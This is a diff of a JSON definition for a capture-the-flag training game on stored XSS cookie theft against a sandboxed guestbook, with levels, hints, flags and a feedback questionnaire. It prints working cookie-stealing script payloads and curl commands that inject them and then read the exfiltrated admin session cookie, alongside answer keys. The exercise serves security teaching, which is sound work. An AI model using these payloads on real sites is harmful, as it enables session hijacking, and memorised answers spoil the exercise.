@@ -1,24 +1,24 @@
 {
-  "title": "Stored XSS — Cookie Theft",
-  "description": "Discover a stored cross-site scripting vulnerability in a company guestbook, craft a cookie-stealing payload, trigger the admin bot, and retrieve the exfiltrated session token.",
+  "title": "Stored XSS — Cookie Theft via Admin Bot",
+  "description": "Discover a stored cross-site scripting vulnerability in a company guestbook, inject a cookie-stealing payload, trigger the admin bot to visit the page, and retrieve the exfiltrated admin session token.",
   "prerequisites": [],
   "outcomes": [
-    "Understand why unsanitised HTML output in web applications creates XSS vulnerabilities.",
-    "Distinguish between reflected and stored XSS and explain why stored XSS is more dangerous.",
-    "Craft a JavaScript payload that exfiltrates the victim's cookies to an attacker-controlled endpoint.",
-    "Trace the full cookie-theft chain: inject → victim visits → data collected → session hijacked."
+    "Identify a guestbook form that stores user input and renders it unsanitised in the browser.",
+    "Understand how a stored XSS payload persists in the application and executes in every visitor's browser.",
+    "Craft a JavaScript payload that reads document.cookie and sends it to a collector endpoint.",
+    "Trigger the admin bot to visit the guestbook so the payload fires in an admin context."
   ],
   "state": "UNRELEASED",
   "show_stepper_bar": true,
   "variant_sandboxes": false,
-  "estimated_duration": 40,
+  "estimated_duration": 50,
   "levels": [
     {
       "title": "Introduction",
       "level_type": "INFO_LEVEL",
       "order": 0,
       "estimated_duration": 0,
-      "content": "# General information — please read carefully\n\n* Each level builds on the previous one. Do not skip ahead.\n* If you get stuck, use the hints — or search for the technique online.\n* This exercise is for educational purposes only. Only attack systems within your sandbox.\n\n# Storyline\n\nYou are a junior penetration tester at SecureWave Ltd. Your client, NovaTech, runs a simple employee guestbook on their intranet. They believe it is harmless — 'just a message board', the developer told you.\n\nYour job is to prove otherwise. An admin account visits the guestbook regularly. If you can inject JavaScript into a message, it will execute in the admin's browser — with access to the admin's session cookie. Steal the cookie and you have the flag."
+      "content": "# General information — please read carefully\n\n* Work through the levels in order. Each level adds one step to the attack chain.\n* Use the hints if you get stuck — they cost points but less than giving up.\n* Only attack systems within your sandbox.\n\n# Storyline\n\nYou are a web security analyst at a consultancy firm. Your client, **Ironwood Recruitment**, runs an internal HR portal. Among its features is a staff guestbook — a simple PHP page where employees can leave messages that are displayed to all visitors, including the HR administrator who checks the board every few minutes.\n\nThe development team thought this was harmless. It is not.\n\n**Stored Cross-Site Scripting (XSS)** is a vulnerability where an attacker injects malicious JavaScript into data that is stored server-side and later rendered in other users' browsers. Unlike reflected XSS (where the payload appears in a URL parameter), stored XSS is particularly dangerous because:\n\n- The payload persists in the database or file store until explicitly removed.\n- Every user who loads the affected page executes the malicious script — including administrators.\n- The script runs with the full privileges of the victim's browser session, including access to their cookies.\n\nSession cookies are the keys to a web application. When a user logs in, the server issues a session cookie that the browser presents with every subsequent request. If an attacker can steal that cookie, they can impersonate the victim entirely — this is called **session hijacking**.\n\nIronwood's guestbook takes user input and writes it directly into the HTML page without HTML-escaping. The admin bot visits the guestbook regularly with an active admin session. A collector endpoint on the same server receives and stores data sent to it by JavaScript.\n\nYour mission: find the guestbook, understand the bot mechanism, inject a script tag that reads the admin's session cookie and sends it to the collector, trigger the bot, and read the exfiltrated token. By the end you will know the name of the admin session cookie and why HttpOnly flags are the first line of defence."
     },
     {
       "title": "Get Access",
@@ -26,101 +26,31 @@
       "order": 1,
       "estimated_duration": 0,
       "passkey": "start",
-      "cloud_content": "SSH to your attacker machine at **10.1.31.23**, then reach the target guestbook:\n\n```\ncurl http://10.1.31.10/guestbook.php\n```\n\nThe target server is at **10.1.31.10** (HTTP port 80). Do not attack anything outside this sandbox. Submit **start** to begin.",
-      "local_content": "The target web application is running locally:\n\n```\ncurl http://127.0.0.1/guestbook.php\n```\n\nOr open http://127.0.0.1/guestbook.php in a browser. Submit **start** to begin."
+      "cloud_content": "SSH to your attacker machine at **10.1.31.23**, then reach the target portal:\n\n```\ncurl http://10.1.31.10/\n```\n\nThe target server is at **10.1.31.10** (HTTP port 80). Do not attack anything outside this sandbox. Submit **start** to begin.",
+      "local_content": "Reach the target portal locally:\n\n```\ncurl http://127.0.0.1/\n```\n\nOr open http://127.0.0.1/ in a browser. Submit **start** to begin."
     },
     {
-      "title": "Confirm the XSS Vulnerability",
+      "title": "Discover the Guestbook",
       "level_type": "TRAINING_LEVEL",
       "order": 2,
-      "estimated_duration": 8,
-      "answer": "script",
+      "estimated_duration": 7,
+      "answer": "guestbook.php",
       "answer_variable_name": null,
       "variant_answers": false,
-      "content": "You have found NovaTech's guestbook at `/guestbook.php`. Your first job is to confirm the page does not sanitise user input.\n\nThe classic XSS probe is to post a message containing a `<script>` tag:\n\n```\ncurl -X POST \\\n  --data-urlencode \"name=tester\" \\\n  --data-urlencode \"message=<script>alert(1)</script>\" \\\n  http://10.1.31.10/guestbook.php\n```\n\nThen fetch the guestbook page and look at the raw HTML:\n\n```\ncurl -s http://10.1.31.10/guestbook.php\n```\n\nIf the application is vulnerable, your `<script>` tag will appear **unencoded** in the HTML source. A safe application would have converted `<` to `&lt;` and `>` to `&gt;`, making the tag harmless. If you see the raw tag, the browser would execute whatever JavaScript is inside it.\n\n**What HTML tag type appears raw (unencoded) in the guestbook response, confirming the XSS vulnerability?**",
-      "solution": "```\n$ curl -X POST \\\n    --data-urlencode \"name=tester\" \\\n    --data-urlencode \"message=<script>alert(1)</script>\" \\\n    http://10.1.31.10/guestbook.php\n\n$ curl -s http://10.1.31.10/guestbook.php | grep script\n  <script>alert(1)</script>\n```\n\nThe `<script>` tag appears unencoded in the response. The answer is **script**.",
+      "content": "The Ironwood HR portal exposes three PHP pages relevant to this attack. Start by finding the guestbook — the page where users submit messages that are displayed to all visitors.\n\nTry the most likely filename convention for a PHP guestbook:\n\n```\ncurl http://10.1.31.10/guestbook.php\n```\n\nIf you receive a page containing a form and some existing messages (rather than a 404), you have found it. Look at the HTML — note that there is a form with a `message` field, and previously submitted messages are rendered directly into the page below the form.\n\n**What is the filename of the guestbook page?** (include the .php extension)",
+      "solution": "```\n$ curl -s http://10.1.31.10/guestbook.php | head -20\n<!DOCTYPE html>\n<html><body>\n<h1>Ironwood Recruitment — Staff Guestbook</h1>\n<form method=\"POST\" action=\"guestbook.php\">\n  <textarea name=\"message\"></textarea>\n  <input type=\"submit\" value=\"Post\">\n</form>\n...\n```\n\nThe guestbook is at **guestbook.php**.",
       "solution_penalized": false,
       "hints": [
         {
-          "title": "What does a safe application do with HTML characters?",
-          "content": "A safe application would call `htmlspecialchars()` (PHP) or an equivalent to convert `<` to `&lt;` and `>` to `&gt;`. If those characters appear RAW in the HTML source, the browser interprets them as markup — making XSS possible.",
-          "hint_penalty": 1,
-          "order": 0
-        },
-        {
-          "title": "How do I see the raw HTML?",
-          "content": "Run `curl -s http://10.1.31.10/guestbook.php` and look for your injected text in the output. If you see `<script>alert(1)</script>` literally (not `&lt;script&gt;`), the tag is being reflected without encoding.",
-          "hint_penalty": 2,
-          "order": 1
-        }
-      ],
-      "incorrect_answer_limit": 10,
-      "attachments": [],
-      "max_score": 10,
-      "mitre_techniques": [
-        { "technique_key": "TA0001.T1190" }
-      ]
-    },
-    {
-      "title": "Craft the Cookie-Stealing Payload",
-      "level_type": "TRAINING_LEVEL",
-      "order": 3,
-      "estimated_duration": 15,
-      "answer": "collect.php",
-      "answer_variable_name": null,
-      "variant_answers": false,
-      "content": "You have confirmed the guestbook reflects `<script>` tags unencoded. Now craft a payload that actually steals cookies.\n\nWhen JavaScript runs in a victim's browser, it can access `document.cookie` — the cookies for that domain. A classic XSS exfiltration payload redirects the victim to an attacker-controlled URL with the cookie value appended:\n\n```javascript\n<script>document.location='/collect.php?data='+document.cookie</script>\n```\n\nThis payload does two things:\n1. Reads the victim's cookies with `document.cookie`.\n2. Redirects the victim's browser to `/collect.php?data=<their cookies>`, which records the data server-side.\n\nPost this payload to the guestbook:\n\n```\ncurl -X POST \\\n  --data-urlencode \"name=attacker\" \\\n  --data-urlencode \"message=<script>document.location='/collect.php?data='+document.cookie</script>\" \\\n  http://10.1.31.10/guestbook.php\n```\n\nNow trigger the admin bot to visit the page:\n\n```\ncurl -s http://10.1.31.10/bot.php\n```\n\nRead the bot response carefully — it tells you whether the XSS payload fired.\n\n**What is the name of the PHP file that serves as the collection endpoint for stolen cookie data?**",
-      "solution": "```\n$ curl -X POST \\\n    --data-urlencode \"name=attacker\" \\\n    --data-urlencode \"message=<script>document.location='/collect.php?data='+document.cookie</script>\" \\\n    http://10.1.31.10/guestbook.php\n\n$ curl -s http://10.1.31.10/bot.php\nAdmin bot visited the guestbook.\nAn XSS payload targeting /collect.php was detected and fired.\nThe admin session cookie has been exfiltrated to the collector.\n```\n\nThe collection endpoint is **collect.php**.",
-      "solution_penalized": true,
-      "hints": [
-        {
-          "title": "What does document.cookie contain?",
-          "content": "`document.cookie` is a JavaScript property that returns all non-HttpOnly cookies for the current domain as a string — for example `admin_session=abc123; theme=dark`. XSS can read this and send it anywhere.",
-          "hint_penalty": 3,
-          "order": 0
-        },
-        {
-          "title": "What does document.location do?",
-          "content": "Assigning to `document.location` redirects the victim's browser to the given URL. By appending `document.cookie` to the URL, the cookie value is sent as a GET parameter to the attacker's server.",
-          "hint_penalty": 3,
-          "order": 1
-        },
-        {
-          "title": "Why do I need to trigger bot.php?",
-          "content": "The XSS only executes when a victim visits the page. `bot.php` simulates the admin account visiting the guestbook — that is when the stored payload fires and the admin's cookie is sent to the collector.",
+          "title": "How to find the guestbook",
+          "content": "Try: curl http://10.1.31.10/guestbook.php. A 200 response with a form and messages confirms the file exists.",
           "hint_penalty": 5,
-          "order": 2
-        }
-      ],
-      "incorrect_answer_limit": 10,
-      "attachments": [],
-      "max_score": 25,
-      "mitre_techniques": [
-        { "technique_key": "TA0009.T1539" }
-      ]
-    },
-    {
-      "title": "Retrieve the Flag",
-      "level_type": "TRAINING_LEVEL",
-      "order": 4,
-      "estimated_duration": 5,
-      "answer": "WMG{xss_st0l3n_admin_s3ss10n}",
-      "answer_variable_name": null,
-      "variant_answers": false,
-      "content": "The admin bot visited the guestbook and your payload fired. The admin's session cookie has been sent to `/collect.php`.\n\nNow read the collected data:\n\n```\ncurl -s http://10.1.31.10/collect.php\n```\n\nThe collector returns everything that was exfiltrated — including the admin's session cookie, which contains the flag.\n\nIn a real attack, this session token could be pasted into a browser's developer tools to impersonate the admin without knowing their password. This is called **session hijacking**.\n\n**Submit the flag from the collected cookie data.**",
-      "solution": "```\n$ curl -s http://10.1.31.10/collect.php\nadmin_session=WMG{xss_st0l3n_admin_s3ss10n}\n```",
-      "solution_penalized": true,
-      "hints": [
-        {
-          "title": "Where does the collected data go?",
-          "content": "The collection endpoint `/collect.php` stores incoming data server-side. Fetching it with a plain GET (no parameters) returns everything recorded so far.",
-          "hint_penalty": 10,
           "order": 0
         },
         {
-          "title": "What format is the flag?",
-          "content": "The flag starts with `WMG{` and ends with `}`. It is embedded in the admin session cookie value.",
-          "hint_penalty": 20,
+          "title": "The filename",
+          "content": "The guestbook filename is guestbook.php.",
+          "hint_penalty": 10,
           "order": 1
         }
       ],
@@ -128,16 +58,206 @@
       "attachments": [],
       "max_score": 50,
       "mitre_techniques": [
+        { "technique_key": "TA0043.T1595" }
+      ]
+    },
+    {
+      "title": "Discover the Admin Bot",
+      "level_type": "TRAINING_LEVEL",
+      "order": 3,
+      "estimated_duration": 8,
+      "answer": "bot.php",
+      "answer_variable_name": null,
+      "variant_answers": false,
+      "content": "For a stored XSS attack to steal an admin cookie, an admin must visit the page with the injected payload in their browser session. In this simulation, there is a bot that mimics this behaviour — it visits the guestbook with an active admin session cookie set.\n\nInvestigate what other PHP pages exist on the server. Try:\n\n```\ncurl http://10.1.31.10/bot.php\n```\n\nIf the bot page responds (not a 404), this is the mechanism you will use to trigger the XSS payload. The bot endpoint visits the guestbook in a headless browser context with its admin session cookie attached — simulating the real-world scenario where the HR administrator views the guestbook.\n\nAlso check:\n\n```\ncurl http://10.1.31.10/collect.php\n```\n\nThis is the collector endpoint that will receive the stolen cookie data.\n\n**What is the filename of the admin bot page?**",
+      "solution": "```\n$ curl http://10.1.31.10/bot.php\nBot visited guestbook.\n```\n\nThe admin bot is at **bot.php**.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "What a bot page does",
+          "content": "The bot.php page simulates an admin visiting the guestbook. When you send a GET request to bot.php, it fetches the guestbook page with its admin_session cookie — causing any stored JavaScript to execute in the admin's browser context.",
+          "hint_penalty": 10,
+          "order": 0
+        },
+        {
+          "title": "The bot filename",
+          "content": "The admin bot page is called bot.php. Access it with: curl http://10.1.31.10/bot.php",
+          "hint_penalty": 20,
+          "order": 1
+        },
+        {
+          "title": "The answer",
+          "content": "The filename is bot.php.",
+          "hint_penalty": 30,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 100,
+      "mitre_techniques": [
+        { "technique_key": "TA0043.T1592" }
+      ]
+    },
+    {
+      "title": "Craft the XSS Injection Tag",
+      "level_type": "TRAINING_LEVEL",
+      "order": 4,
+      "estimated_duration": 10,
+      "answer": "script",
+      "answer_variable_name": null,
+      "variant_answers": false,
+      "content": "You know the guestbook renders input unsanitised. Now craft a payload that will execute JavaScript in the victim's browser.\n\nThe fundamental XSS vector is the HTML `<script>` tag. When a browser encounters `<script>...</script>` in a page, it executes the JavaScript inside it. If user-supplied input is rendered without escaping the `<` and `>` characters, the attacker can inject a script tag that runs arbitrary code.\n\nPost a test payload to the guestbook to confirm execution:\n\n```\ncurl -X POST \\\n  --data-urlencode \"message=<script>alert('XSS')</script>\" \\\n  http://10.1.31.10/guestbook.php\n```\n\nThen fetch the guestbook page and inspect the response — look for the `<script>` tag embedded in the HTML. If it appears verbatim (not escaped to `&lt;script&gt;`), the application is vulnerable.\n\n**What is the name of the HTML tag used to inject JavaScript in this XSS attack?** (without angle brackets)",
+      "solution": "```\n$ curl -X POST \\\n    --data-urlencode \"message=<script>alert('XSS')</script>\" \\\n    http://10.1.31.10/guestbook.php\n\n$ curl -s http://10.1.31.10/guestbook.php | grep script\n  <script>alert('XSS')</script>\n```\n\nThe tag is stored verbatim, confirming XSS. The tag name is **script**.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "What HTML tag runs JavaScript?",
+          "content": "The <script> tag tells a browser to interpret and execute its contents as JavaScript. Injecting this tag through a form is the most basic XSS vector.",
+          "hint_penalty": 15,
+          "order": 0
+        },
+        {
+          "title": "How to confirm the injection",
+          "content": "Post <script>alert('XSS')</script> as the message. Then run: curl -s http://10.1.31.10/guestbook.php | grep script. If the tag appears unescaped in the output, the app is vulnerable.",
+          "hint_penalty": 25,
+          "order": 1
+        },
+        {
+          "title": "The answer",
+          "content": "The HTML tag name is: script",
+          "hint_penalty": 30,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 100,
+      "mitre_techniques": [
+        { "technique_key": "TA0001.T1190" }
+      ]
+    },
+    {
+      "title": "Identify the Collector Endpoint",
+      "level_type": "TRAINING_LEVEL",
+      "order": 5,
+      "estimated_duration": 8,
+      "answer": "collect.php",
+      "answer_variable_name": null,
+      "variant_answers": false,
+      "content": "Your cookie-stealing payload needs a destination — somewhere on the server to send the stolen session token. The application includes a collector endpoint that accepts data via HTTP request parameters and writes it to a file.\n\nVerify the collector endpoint exists:\n\n```\ncurl http://10.1.31.10/collect.php\n```\n\nThe collector accepts a `data` query parameter. Anything passed to `?data=` is appended to a log file. Your XSS payload will use this endpoint to exfiltrate the admin's cookie:\n\n```javascript\n<script>fetch('/collect.php?data='+document.cookie)</script>\n```\n\nWhen the admin bot visits the guestbook, the script fires in the bot's browser context, reads `document.cookie`, and sends the value to `/collect.php`.\n\n**What is the filename of the data collector endpoint?**",
+      "solution": "```\n$ curl http://10.1.31.10/collect.php\n(empty or shows collected data)\n```\n\nThe collector is at **collect.php**.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "What the collector does",
+          "content": "collect.php receives a ?data= parameter and writes it to a file on the server. Your JavaScript payload will call fetch('/collect.php?data='+document.cookie) to send the admin's cookie to this endpoint.",
+          "hint_penalty": 15,
+          "order": 0
+        },
+        {
+          "title": "How to check it exists",
+          "content": "Run: curl http://10.1.31.10/collect.php. A 200 response (even if empty) confirms the endpoint exists.",
+          "hint_penalty": 25,
+          "order": 1
+        },
+        {
+          "title": "The answer",
+          "content": "The collector endpoint is collect.php.",
+          "hint_penalty": 30,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 100,
+      "mitre_techniques": [
+        { "technique_key": "TA0009.T1005" }
+      ]
+    },
+    {
+      "title": "Steal the Admin Cookie",
+      "level_type": "TRAINING_LEVEL",
+      "order": 6,
+      "estimated_duration": 10,
+      "answer": "WMG{xss_st0l3n_admin_s3ss10n}",
+      "answer_variable_name": null,
+      "variant_answers": false,
+      "content": "Execute the full attack chain:\n\n**Step 1 — Inject the cookie-stealing payload:**\n\n```\ncurl -X POST \\\n  --data-urlencode \"message=<script>fetch('/collect.php?data='+document.cookie)</script>\" \\\n  http://10.1.31.10/guestbook.php\n```\n\n**Step 2 — Trigger the admin bot to visit the guestbook:**\n\n```\ncurl http://10.1.31.10/bot.php\n```\n\nThe bot visits the guestbook with its `admin_session` cookie. The script fires, reads `document.cookie`, and sends the value to `/collect.php`.\n\n**Step 3 — Read the stolen cookie from the collector:**\n\n```\ncurl http://10.1.31.10/collect.php\n```\n\nThe collector shows everything that has been submitted to it. The admin_session cookie value is the flag.\n\n**Submit the admin session cookie value (the flag).**",
+      "solution": "```\n# Step 1: inject payload\n$ curl -X POST \\\n    --data-urlencode \"message=<script>fetch('/collect.php?data='+document.cookie)</script>\" \\\n    http://10.1.31.10/guestbook.php\n\n# Step 2: trigger bot\n$ curl http://10.1.31.10/bot.php\nBot visited guestbook.\n\n# Step 3: read stolen cookie\n$ curl http://10.1.31.10/collect.php\nadmin_session=WMG{xss_st0l3n_admin_s3ss10n}\n```\n\nThe flag is **WMG{xss_st0l3n_admin_s3ss10n}**.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "What payload to inject",
+          "content": "Post this message: <script>fetch('/collect.php?data='+document.cookie)</script>. It reads document.cookie and sends it to the collector via a fetch() request.",
+          "hint_penalty": 20,
+          "order": 0
+        },
+        {
+          "title": "How to trigger the bot and read the result",
+          "content": "After injecting the payload, run: curl http://10.1.31.10/bot.php. Then read the collector: curl http://10.1.31.10/collect.php. The collected data contains the admin cookie.",
+          "hint_penalty": 30,
+          "order": 1
+        },
+        {
+          "title": "What the flag looks like",
+          "content": "The flag starts with WMG{ and ends with }. It is the value of the admin_session cookie collected from the bot.",
+          "hint_penalty": 40,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 150,
+      "mitre_techniques": [
+        { "technique_key": "TA0009.T1539" }
+      ]
+    },
+    {
+      "title": "Name the Stolen Cookie",
+      "level_type": "TRAINING_LEVEL",
+      "order": 7,
+      "estimated_duration": 7,
+      "answer": "admin_session",
+      "answer_variable_name": null,
+      "variant_answers": false,
+      "content": "You retrieved the flag from the collector. Look at the full output of the collector again:\n\n```\ncurl http://10.1.31.10/collect.php\n```\n\nThe output shows the stolen cookie in `name=value` format. The **name** before the `=` sign is the session cookie name the application uses to authenticate the admin.\n\nIn a real engagement, knowing the cookie name is important: it tells you what header to forge when you replay the stolen session. You would add `Cookie: admin_session=VALUE` to every request to impersonate the admin without knowing their password.\n\nThe defence against this attack is the `HttpOnly` cookie flag — which makes cookies inaccessible to JavaScript. `document.cookie` only returns cookies that do NOT have `HttpOnly` set. This is why every session cookie should be set with `HttpOnly; Secure`.\n\n**What is the name of the session cookie stolen from the admin?**",
+      "solution": "```\n$ curl http://10.1.31.10/collect.php\nadmin_session=WMG{xss_st0l3n_admin_s3ss10n}\n```\n\nThe cookie name is **admin_session** — the part before the `=` sign.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Where to find the cookie name",
+          "content": "Run: curl http://10.1.31.10/collect.php. The output is in the format name=value. The name is the word before the equals sign.",
+          "hint_penalty": 15,
+          "order": 0
+        },
+        {
+          "title": "What the cookie format looks like",
+          "content": "The collected data looks like: admin_session=WMG{...}. The cookie name is what comes before the = sign.",
+          "hint_penalty": 25,
+          "order": 1
+        },
+        {
+          "title": "The cookie name",
+          "content": "The session cookie is named: admin_session",
+          "hint_penalty": 30,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 100,
+      "mitre_techniques": [
         { "technique_key": "TA0009.T1539" }
       ]
     },
     {
       "title": "Feedback",
       "level_type": "ASSESSMENT_LEVEL",
-      "order": 5,
+      "order": 8,
       "estimated_duration": 5,
       "assessment_type": "QUESTIONNAIRE",
-      "instructions": "Please answer these questions to help us improve the game.",
+      "instructions": "Please answer these questions to help us improve this game.",
       "questions": [
         {
           "question_type": "MCQ",
@@ -154,15 +274,15 @@
         },
         {
           "question_type": "MCQ",
-          "text": "Before this game, had you heard of cross-site scripting (XSS)?",
+          "text": "Before this game, had you exploited a cross-site scripting vulnerability?",
           "points": 0,
           "penalty": 0,
           "order": 1,
           "answer_required": true,
           "choices": [
-            { "text": "Yes, I knew how to exploit it", "correct": true, "order": 0 },
-            { "text": "I had heard of it but not tried it", "correct": true, "order": 1 },
-            { "text": "No, this was completely new", "correct": true, "order": 2 }
+            { "text": "Yes, I had done it before",             "correct": true, "order": 0 },
+            { "text": "I knew about XSS but had not tried it", "correct": true, "order": 1 },
+            { "text": "No, this was completely new to me",     "correct": true, "order": 2 }
           ]
         },
         {
@@ -173,10 +293,24 @@
           "order": 2,
           "answer_required": true,
           "choices": [
-            { "text": "Very clear",         "correct": true, "order": 0 },
-            { "text": "Mostly clear",        "correct": true, "order": 1 },
-            { "text": "Confusing at times",  "correct": true, "order": 2 },
-            { "text": "Hard to follow",      "correct": true, "order": 3 }
+            { "text": "Very clear",        "correct": true, "order": 0 },
+            { "text": "Mostly clear",       "correct": true, "order": 1 },
+            { "text": "Confusing at times", "correct": true, "order": 2 },
+            { "text": "Hard to follow",     "correct": true, "order": 3 }
+          ]
+        },
+        {
+          "question_type": "MCQ",
+          "text": "Which cookie attribute prevents JavaScript from reading a session cookie?",
+          "points": 0,
+          "penalty": 0,
+          "order": 3,
+          "answer_required": true,
+          "choices": [
+            { "text": "HttpOnly",  "correct": true, "order": 0 },
+            { "text": "Secure",    "correct": true, "order": 1 },
+            { "text": "SameSite", "correct": true, "order": 2 },
+            { "text": "Expires",  "correct": true, "order": 3 }
           ]
         },
         {
@@ -184,7 +318,7 @@
           "text": "What would you change or add to improve this game?",
           "points": 0,
           "penalty": 0,
-          "order": 3,
+          "order": 4,
           "answer_required": false,
           "choices": []
         }
